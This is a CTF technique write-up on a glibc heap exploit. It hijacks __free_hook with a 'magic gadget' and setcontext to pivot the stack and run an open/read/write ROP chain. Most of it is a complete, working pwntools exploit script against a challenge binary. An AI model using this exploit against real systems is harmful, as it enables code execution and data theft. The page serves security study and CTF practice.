---
title: "setcontext Pivot - SROP-Style Register Control From a Hook Overwrite"
category: pwn
subcategory: heap
type: technique
tags: [setcontext, srop, ucontext, stack-pivot, free-hook, rop, orw, seccomp, mprotect, magic-gadget, rdx-gadget, heap, pwntools, pwndbg, gef, one-gadget]
difficulty: hard
summary: "Point __free_hook at setcontext+61 and let glibc load every register from a fake ucontext inside your heap chunk - a full stack pivot in one write."
when_to_use:
  - "seccomp blocks execve so one_gadget and system are useless"
  - "You have an arbitrary write but no stack leak, and need a ROP chain anyway"
  - "A one_gadget's constraints can never be satisfied at the hook call site"
  - "You need to set rsp/rip/rdi/rsi/rdx all at once from heap data"
tools: [pwntools, pwndbg, gef, ROPgadget, seccomp-tools, one-gadget]
related: [heap-write-targets, heap-fsop-file-struct, house-of-apple, heap-tcache-poisoning]
---

## TL;DR

`setcontext` restores the entire CPU state from a `ucontext_t`. Skip its prologue and
you land on a straight run of `mov reg, [rdi+off]` (glibc <= 2.28) or
`mov reg, [rdx+off]` (glibc >= 2.29) ending in `ret`. Put a fake ucontext in a heap
chunk, set `__free_hook = setcontext+61`, and `free(chunk)` becomes "load 15 registers
and jump" - a stack pivot plus argument setup in a single primitive.

## Recognise it

- `seccomp-tools dump ./chal` shows `execve` and `execveat` killed but
  `open`/`read`/`write` allowed - you need an ORW chain, so you need a stack.
- `one_gadget` prints constraints (`rsp & 0xf == 0`, `[rsp+0x70] == NULL`) that never
  hold when the hook fires.
- You have a heap chunk of >= 0xE0 bytes whose address you know, plus a libc leak.
- Full RELRO, no stack leak, but you can write to `__free_hook` / a FILE vtable slot.

## Vulnerable code shape

```c
/* You already have this much: */
void arbitrary_write(void *addr, void *val) { *(void **)addr = val; }

/* The program then does, at some point: */
free(user_chunk);      /* rdi = user_chunk, and __free_hook is called with it */
```

The `free` call site is what makes this work: `rdi` already points at memory you own.

## Theory

Targets: glibc 2.23 - 2.39. The offset and pivot register change at 2.29.

### `setcontext` disassembly

glibc <= 2.28 (`setcontext+53`), rdi-based:

```asm
setcontext+53:
  mov    rsp, QWORD PTR [rdi+0xa0]
  mov    rbx, QWORD PTR [rdi+0x80]
  mov    rbp, QWORD PTR [rdi+0x78]
  mov    r12, QWORD PTR [rdi+0x48]
  ...
  mov    rcx, QWORD PTR [rdi+0xa8]
  push   rcx                       ; the return address
  mov    rsi, QWORD PTR [rdi+0x70]
  mov    rdx, QWORD PTR [rdi+0x88]
  mov    rcx, QWORD PTR [rdi+0x98]
  mov    r8,  QWORD PTR [rdi+0x28]
  mov    r9,  QWORD PTR [rdi+0x30]
  mov    rdi, QWORD PTR [rdi+0x68]
  xor    eax, eax
  ret
```

glibc >= 2.29 (`setcontext+61`), rdx-based - the same code with `rdi` replaced by
`rdx`, because 2.29 added an `rt_sigprocmask` call that clobbers `rdi`:

```asm
setcontext+61:
  mov    rsp, QWORD PTR [rdx+0xa0]
  mov    rbx, QWORD PTR [rdx+0x80]
  ...
  mov    rcx, QWORD PTR [rdx+0xa8]
  push   rcx
  mov    rdi, QWORD PTR [rdx+0x68]
  xor    eax, eax
  ret
```

Always verify against *your* libc:

```
pwndbg> x/40i setcontext
```

and take the address of the first `mov rsp, [rXX+0xa0]`. The `+53`/`+61` numbers are
build-dependent shorthand.

### The register map

Offsets are relative to the `ucontext_t` pointer held in `rdi`/`rdx`. Within
`ucontext_t`, `uc_mcontext.gregs` starts at 0x28, so these are the *whole struct*
offsets you actually pack:

| offset | register | offset | register |
|--------|----------|--------|----------|
| 0x28 | R8 | 0x80 | RBX |
| 0x30 | R9 | 0x88 | RDX |
| 0x48 | R12 | 0x90 | RAX |
| 0x50 | R13 | 0x98 | RCX |
| 0x58 | R14 | 0xA0 | RSP |
| 0x60 | R15 | 0xA8 | RIP (pushed, then `ret`) |
| 0x68 | RDI | 0xE0 | `fpregs` - **must be NULL** |
| 0x70 | RSI | | |
| 0x78 | RBP | | |

The `fpregs` field at 0xE0 matters: `setcontext` does
`fldenv`/`ldmxcsr` from it when non-NULL. Zero it.

### The rdx problem (2.29+)

`free(p)` gives you `rdi = p`, not `rdx`. So you cannot jump straight to
`setcontext+61`. You need a one-gadget-style pivot that moves a value from `[rdi]`
into `rdx`. glibc ships several; find them with:

```
ROPgadget --binary libc.so.6 --only "mov|ret" | grep "mov rdx, qword ptr \[rdi"
```

The classic ones in modern glibc are inside `svcudp_reply` / `getkeyserv_handle`:

```asm
; libc 2.31/2.35 - "the magic gadget"
mov rdx, QWORD PTR [rdi+0x8]
mov QWORD PTR [rsp], rax
call QWORD PTR [rdx+0x20]
```

Usage: set `__free_hook` = that gadget. Then with `rdi = chunk`:
- `chunk + 0x8` holds `&fake_ucontext`
- `fake_ucontext + 0x20` holds `setcontext+61`
- the `call` lands in setcontext with `rdx` already pointing at the ucontext.

A simpler alternative, if the libc has it, is
`mov rdx, [rdi+8] ; mov rax, [rdi] ; mov rdi, rdx ; jmp rax`. Search with
`ROPgadget --binary libc.so.6 --re "mov rdx"` and pick whichever suits.

### Why this beats a plain ROP chain

You get `rsp` pointing at a heap address you control, so the ROP chain lives in the
heap and needs no stack leak. And `rdi`/`rsi`/`rdx` are set for the first call for
free - handy for `mprotect(page, 0x1000, 7)` followed by shellcode.

## Attack

glibc 2.31, seccomp allows `open/read/write`, goal: ORW the flag.

1. Leak libc (unsorted bin) and the heap (tcache `next`).
2. Allocate a large chunk `C` (0x200+) and note its address.
3. Lay out inside `C`:
   - `C + 0x00`: `"./flag\x00"` (the path for `open`)
   - `C + 0x08`: `&C` (so the magic gadget reads `rdx = &C`... use a second chunk if
     the layout is tight)
   - `C + 0x20`: `setcontext + 61` (the `call [rdx+0x20]` target)
   - `C + 0xA0`: `rsp` = `C + 0x100` (where the ROP chain lives)
   - `C + 0xA8`: `rip` = a `ret` gadget
   - `C + 0x100`: the ORW ROP chain
4. Tcache-poison `__free_hook` and write the magic gadget address there.
5. `free(C)` -> `__free_hook(C)`:
   - `rdi = C`
   - `mov rdx, [rdi+8]` -> `rdx = &C`
   - `call [rdx+0x20]` -> `setcontext+61`
   - `setcontext` loads `rsp = C+0x100`, `rip = ret`
   - the ROP chain runs.
6. Chain: `open("./flag", 0)` / `read(3, buf, 0x100)` / `write(1, buf, 0x100)`.

## Heap state

```text
chunk C at 0x55a1b2c03400

 +0x000 | "./flag\0"                       |  <- rdi for open(), also the free()'d ptr
 +0x008 | 0x55a1b2c03400  (&C)             |  <- magic gadget: mov rdx,[rdi+8]
 +0x010 | 0                                |
 +0x020 | setcontext+61                    |  <- magic gadget: call [rdx+0x20]
 ...
 +0x068 | rdi = 0x55a1b2c03400 ("./flag")  |
 +0x070 | rsi = 0                          |
 +0x088 | rdx = 0                          |
 +0x0a0 | rsp = 0x55a1b2c03500             |  <- the pivot
 +0x0a8 | rip = <ret gadget>               |
 +0x0e0 | fpregs = 0                       |  <- MUST be NULL
 ...
 +0x100 | pop rdi; ret                     |  <- ROP chain starts here
 +0x108 | &"./flag"                        |
 +0x110 | pop rsi; ret                     |
 +0x118 | 0                                |
 +0x120 | open                             |
 +0x128 | pop rdi; ret                     |
 +0x130 | 3                                |
 ...

libc:
  __free_hook -> mov rdx,[rdi+8] ; mov [rsp],rax ; call [rdx+0x20]

free(C)
  -> __free_hook(C)            rdi = C
  -> rdx = *(C+8) = C
  -> call *(C+0x20) = setcontext+61
  -> rsp = C+0x100 ; ret       => the ROP chain executes on the heap
```

## Exploit

```python
#!/usr/bin/env python3
"""setcontext pivot: __free_hook -> magic gadget -> setcontext+61 -> ORW ROP.

Target: glibc 2.29 - 2.33 (rdx-based setcontext, hooks still present).
For glibc <= 2.28 set SETCONTEXT_RDI=1: setcontext+53 reads from rdi directly,
so you can put it straight in __free_hook with no magic gadget.

Usage:
    ./exploit.py
    ./exploit.py FLAG=/flag.txt
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
from pwn import ELF, ROP, args, context, log, p64, process, remote, u64

BINARY = args.BIN or "./chal"
LIBC = args.LIBC or "./libc.so.6"
FLAG_PATH = (args.FLAG or "./flag").encode()

context.binary = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
libc = ELF(LIBC, checksec=False)

# ucontext_t register offsets (whole-struct, x86-64)
UC = {
    "r8": 0x28, "r9": 0x30, "r12": 0x48, "r13": 0x50, "r14": 0x58, "r15": 0x60,
    "rdi": 0x68, "rsi": 0x70, "rbp": 0x78, "rbx": 0x80, "rdx": 0x88,
    "rax": 0x90, "rcx": 0x98, "rsp": 0xA0, "rip": 0xA8, "fpregs": 0xE0,
}
UC_SIZE = 0xF0


def build_ucontext(**regs) -> bytes:
    """Pack a fake ucontext_t. Unknown keys raise; fpregs defaults to NULL."""
    buf = bytearray(UC_SIZE)
    regs.setdefault("fpregs", 0)
    for name, val in regs.items():
        assert name in UC, "unknown register %r" % name
        off = UC[name]
        buf[off:off + 8] = p64(val)
    return bytes(buf)


def find_magic_gadget(rop: ROP, lib: ELF) -> int:
    """mov rdx, [rdi+8] ; ... ; call [rdx+0x20]  - present in modern glibc.

    We search the raw bytes because ROPgadget/pwntools do not model `call [reg]`.
    """
    # 48 8b 57 08 : mov rdx, qword ptr [rdi + 8]
    # ff 52 20    : call qword ptr [rdx + 0x20]
    data = lib.get_section_by_name(".text").data()
    base = lib.get_section_by_name(".text").header.sh_addr
    needle = b"\x48\x8b\x57\x08"
    idx = 0
    while True:
        idx = data.find(needle, idx)
        if idx < 0:
            return 0
        window = data[idx:idx + 0x20]
        if b"\xff\x52\x20" in window:
            assert rop is not None
            return lib.address + base + idx
        idx += 1


io = (remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
      if args.REMOTE else process([BINARY]))


def menu(c):
    io.sendlineafter(b"> ", str(c).encode())


def alloc(i, n, d=b"A"):
    menu(1)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendlineafter(b"size: ", str(n).encode())
    io.sendafter(b"content: ", d)


def free(i):
    menu(2)
    io.sendlineafter(b"index: ", str(i).encode())


def show(i):
    menu(3)
    io.sendlineafter(b"index: ", str(i).encode())
    io.recvuntil(b"content: ")
    return io.recvline().rstrip(b"\n")


def edit(i, d):
    menu(4)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendafter(b"content: ", d)


def lk(raw):
    return u64(raw.ljust(8, b"\x00")[:8])


# ---------------------------------------------------------------- 1. leaks
alloc(0, 0x418, b"leaker")
alloc(1, 0x18, b"guard")
free(0)
libc.address = lk(show(0)) - 0x60 - libc.sym["main_arena"]
log.success("libc base = %#x", libc.address)

alloc(2, 0x28, b"h")
free(2)
heap_page = lk(show(2)) << 12
log.success("heap page = %#x", heap_page)

rop = ROP(libc)
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
POP_RSI = rop.find_gadget(["pop rsi", "ret"])[0]
POP_RDX = (rop.find_gadget(["pop rdx", "ret"]) or [0])[0]
RET = rop.find_gadget(["ret"])[0]
log.info("pop rdi = %#x  pop rsi = %#x  ret = %#x", POP_RDI, POP_RSI, RET)

setcontext = libc.sym["setcontext"]
SETCONTEXT_OFF = 53 if args.SETCONTEXT_RDI else 61
sc = setcontext + SETCONTEXT_OFF
log.info("setcontext+%d = %#x", SETCONTEXT_OFF, sc)

# ------------------------------------------------- 2. stage the fake context
alloc(3, 0x300, b"stage")
# Find the real address of chunk 3 with vis_heap_chunks once, then keep it.
CHUNK3_OFF = 0x6E0
C = heap_page + CHUNK3_OFF
log.info("staging chunk @ %#x", C)

assert POP_RDX, "no 'pop rdx' gadget: set rdx from the ucontext (offset 0x88) instead"
rop_chain = b"".join([
    p64(POP_RDI), p64(C),                      # rdi = path
    p64(POP_RSI), p64(0),                      # rsi = O_RDONLY
    p64(libc.sym["open"]),
    p64(POP_RDI), p64(3),                      # fd
    p64(POP_RSI), p64(C + 0x200),              # buf
    p64(POP_RDX), p64(0x100),                  # count
    p64(libc.sym["read"]),
    p64(POP_RDI), p64(1),                      # stdout
    p64(POP_RSI), p64(C + 0x200),
    p64(POP_RDX), p64(0x100),
    p64(libc.sym["write"]),
])

uctx = build_ucontext(rdi=C, rsi=0, rdx=0, rsp=C + 0x100, rip=RET)

payload = bytearray(0x300)
payload[0x00:len(FLAG_PATH) + 1] = FLAG_PATH + b"\x00"
payload[0x08:0x10] = p64(C)            # magic gadget reads rdx from here
payload[0x20:0x28] = p64(sc)           # magic gadget calls [rdx+0x20]
# splice the ucontext in, but keep our first 0x28 bytes
payload[0x28:UC_SIZE] = uctx[0x28:UC_SIZE]
payload[0x100:0x100 + len(rop_chain)] = rop_chain
edit(3, bytes(payload))
log.info("fake ucontext + ROP chain staged")

# ----------------------------------------------- 3. point __free_hook at it
if args.SETCONTEXT_RDI:
    hook_value = sc                    # glibc <= 2.28: rdi is already the ucontext
else:
    magic = find_magic_gadget(rop, libc)
    assert magic, "no 'mov rdx,[rdi+8] ; call [rdx+0x20]' gadget in this libc"
    log.success("magic gadget = %#x", magic)
    hook_value = magic

alloc(4, 0x88, b"A" * 8)
alloc(5, 0x88, b"B" * 8)
free(4)
free(5)
edit(5, p64(libc.sym["__free_hook"]))
alloc(6, 0x88, b"pad")
alloc(7, 0x88, p64(hook_value))
log.success("__free_hook = %#x", hook_value)

# ------------------------------------------------------------ 4. detonate
free(3)                                 # rdi = C -> rdx = C -> setcontext+61
print(io.recvall(timeout=3).decode(errors="replace"))
```

## Variants & pitfalls

- **Verify the offset.** `x/40i setcontext` and take the address of the first
  `mov rsp, QWORD PTR [rXX+0xa0]`. Do not trust 53/61 blindly.
- **`fpregs` at 0xE0 must be 0.** A garbage pointer there makes `setcontext` fault in
  `fldenv`.
- **rdx vs rdi.** 2.29 changed the register. If your pivot jumps straight to
  `setcontext+61` with only `rdi` set, you get a segfault at `mov rsp, [rdx+0xa0]`.
- **FSOP entry instead of a hook.** On 2.34+ there is no `__free_hook`; reach
  `setcontext` through the house of apple chain - set the fake wide vtable's
  `__doallocate` to the magic gadget, since `rdi` there is the fake FILE.
- **Shorter path: `mprotect` + shellcode.** If the ROP chain is awkward, use the
  pivot to call `mprotect(heap_page, 0x2000, 7)` then `jmp` to shellcode in the same
  chunk. Two gadgets instead of nine.
- **Alignment.** `movaps` inside `open`/`read` needs `rsp & 0xf == 0`. The pivot lets
  you choose `rsp`, so pick a 16-byte aligned address; if you still crash in
  `__memmove_avx_unaligned`, add one `ret` to the chain.
- **`pop rdx; ret` is rare in modern libc.** Use `pop rdx; pop rbx; ret` or set `rdx`
  from the ucontext directly (offset 0x88) and make `read`'s length come from there.
- **Seccomp first.** `seccomp-tools dump ./chal` tells you whether you need ORW at all.

## Debugging

```text
pwndbg> x/40i setcontext
pwndbg> p/x (long)setcontext + 61
pwndbg> b *(setcontext+61)
pwndbg> x/32gx $rdx                     # your fake ucontext, at the moment of truth
pwndbg> telescope $rsp 20               # after the pivot: is the ROP chain there?
pwndbg> search -t bytes "\x48\x8b\x57\x08"    # find the magic gadget
pwndbg> vmmap
```

```bash
# Find the rdx pivot gadgets.
ROPgadget --binary ./libc.so.6 --re "mov rdx, qword ptr \[rdi" | head
ROPgadget --binary ./libc.so.6 --re "pop rdx" | head
# What syscalls are allowed?
seccomp-tools dump ./chal
```

## Tools

- `ROPgadget` / `ropr` for the rdx pivot.
- `seccomp-tools` to decide ORW vs execve.
- `pwntools` `ROP(libc)` for the standard pops.
- `pwndbg search -t bytes` to locate `call [rdx+0x20]` sequences.

## References

- glibc `sysdeps/unix/sysv/linux/x86_64/setcontext.S`.
- `ucontext_t` / `mcontext_t` layout in `sysdeps/unix/sysv/linux/x86_64/sys/ucontext.h`.
- The "magic gadget" pattern is widely documented in modern heap write-ups.
